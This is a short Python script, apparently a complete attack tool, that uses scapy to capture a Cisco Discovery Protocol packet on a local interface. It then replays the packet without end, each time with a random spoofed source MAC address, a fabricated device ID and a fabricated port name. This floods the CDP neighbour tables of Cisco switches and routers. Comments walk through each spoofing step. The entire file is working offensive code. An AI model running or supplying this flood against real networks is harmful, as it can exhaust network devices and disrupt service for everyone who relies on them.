import sys

from scapy.layers.l2 import  SNAP, LLC, Dot3
from scapy.all import *
from time import sleep
import MACCHANGER
import random

def Stop_filter(stop):
    """
    Function to Stop the Sniffing if STP is Identified inside a packet
    :param stop: Sniffed Packet
    :return:
    """
    if stop[SNAP].code == 8192:
        return True
    else:
        return False


# 2000 code vayo ki aaucha 2004 vayo ki aaudaina

def hell(Packet):
    Main_iface = ["GigabitEthernet0/", "GigabitEthernet1/", "FastEthernet0/", "FastEthernet1/"]
    # Converting The Scapy Raw Format of CDP Field TO Readable Format by decoding
    load_contrib("cdp")

    # Checkig The Code
    cod = Packet[SNAP].code

    try:
        if cod == 8192:
            print("A")
            try:
                while True:
                    # Attaching Fake Source MAC Addresses
                    fakemac = MACCHANGER.MAC_CH().Random_MAC_Generator()
                    Packet[Dot3].src = fakemac

                    # Deleting Checksum To Be safe from Malformed Packets
                    del Packet["CDPv2_HDR"].cksum

                    # Deleting The Real Length Of the Packet
                    del Packet[Dot3].len

                    # Deleting Length in The Device Information Field
                    del Packet["CDPMsgDeviceID"].len

                    # Inserting Fake Device ID
                    first = ["SW", "R", "SW1", "SW2", "R1", "R2", "Router11", "Router0", "Switch", "Switch10", "Fw", "Cisc",
                             "Fort-SW", "Juniper", "IP-ph1", "Ip-ph2"]
                    second = ["Main", "Bld1", "Bld2", "Edg", "Rk1", "SrvRm-Main", "Srv", "Dtc", "Floor1", "IT", "Account",
                              "Hdt", "Biratnagar", "Butwal", "Dhangadi", "Upl"]
                    deviceids = random.choice(first) + "-" + random.choice(second)
                    Packet["CDPMsgDeviceID"].val = (deviceids).encode()

                    # Deleting Length in The Device Information Field
                    del Packet["CDPMsgPortID"].len

                    # Changing the Interfaces
                    randd = random.randint(0, 20)
                    newint = random.choice(Main_iface) + str(randd)
                    Packet["CDPMsgPortID"].iface = (newint).encode()


                    # Sending Modified Packets
                    sendp(Packet, iface="eth1", verbose=1)
                    # sleep(2)
            except KeyboardInterrupt:
                sys.exit()
                
    except EOFError:
        print("Ther Might be no any CDP in the Line, Please Try Again")



sniff(iface="eth1",  filter="ether dst 01:00:0c:cc:cc:cc", stop_filter = Stop_filter, prn = hell)




